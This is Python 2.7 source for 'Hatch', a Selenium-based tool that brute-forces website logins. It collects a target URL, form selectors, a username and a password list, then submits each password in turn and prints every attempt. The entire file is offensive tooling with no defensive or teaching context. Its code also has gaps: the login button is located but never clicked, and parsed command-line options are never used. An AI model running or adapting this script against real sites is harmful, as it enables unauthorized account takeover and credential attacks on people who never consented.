# Hatch Python 2.7
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

# Configuration
parser = OptionParser()
now = datetime.datetime.now()

# Arguments
parser.add_option("-u", "--username", dest="username", help="Choose the Username")
parser.add_option("--usernamesel", dest="usernamesel", help="Choose the Username selector")
parser.add_option("--passsel", dest="passsel", help="Choose the Password selector")
parser.add_option("--loginsel", dest="loginsel", help= "Choose the Login Button selector")
parser.add_option("--passlist", dest="passlist", help="Enter the password list directory")
parser.add_option("--website", dest="website", help="Choose a website")
(options, args) = parser.parse_args()

CHROME_DVR_DIR = 'C:\webdrivers\chromedriver.exe'

def wizard():
    print(banner)
    website = raw_input('Enter a website: ')
    sys.stdout.write('[!] Checking if website exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print('[OK]')
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print('[!] User used Ctrl-C to exit. ')
        exit()
    except:
        t.sleep(1)
        print('[X] ')
        t.sleep(1)
        print('[!] Website could not be located. Make sure to include http:// or https:// ')
        exit()

    username_selector = raw_input('[~] Enter the Username selector: ')
    password_selector = raw_input('[~] Enter the Password selector: ')
    login_btn_selector = raw_input('[~] Enter the Login Button selector: ')
    username = raw_input('[~] Enter the Username to brute-force: ')
    pass_list = raw_input('[~] Enter a directory to a password list: ')
    brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)

def brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website):
    f = open(pass_list, 'r')
    temp = ''
    temp_website = website
    while True:
        try:
            for line in f:
                driver.get(temp_website)
                t.sleep(1)
                Sel_user = driver.find_element_by_css_selector(username_selector)
                Sel_pas = driver.find_element_by_css_selector(password_selector)
                enter = driver.find_element_by_css_selector(login_btn_selector)
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                t.sleep(1)
                print('------------------------')
                print('Attempted Password: ' + line + 'for the Username: ' + username)
                print('------------------------')
                temp = line 
                temp_website = driver.current_url
        except KeyboardInterrupt: 
            break # Returns to main menu if Ctrl-C is used
        except selenium.common.exceptions.NoSuchElementException:
            print('BRUTE FORCE ATACK COMPLETE! ')
            print('LAST PASSWORD ATTEMPT WAS: {0}'.format(temp))
            break # Results of Brute Fortce attack

banner = '''

 | |  | |     | |     | |
 | |__| | __ _| |_ ___| |__ 
 |  __  |/ _` | __/ __| '_ \\
 | |  | | (_| | || (__| | | |
 |_|  |_|\__,_|\__\___|_| |_|
 
 [-]--> V.1.1
 [-]--> coded by Metachar
 [-]--> edited by Matthew Guillen
 [-]--> Hatch Brute-Force tool 
'''

optionss = webdriver.ChromeOptions()
optionss.add_experimental_option('excludeSwitches', ['enable-logging'])
optionss.add_argument("--disable-popup-blocking")
optionss.add_argument("--disable-extensions")
driver = webdriver.Chrome(executable_path=CHROME_DVR_DIR, options=optionss)

if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        wizard()

username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
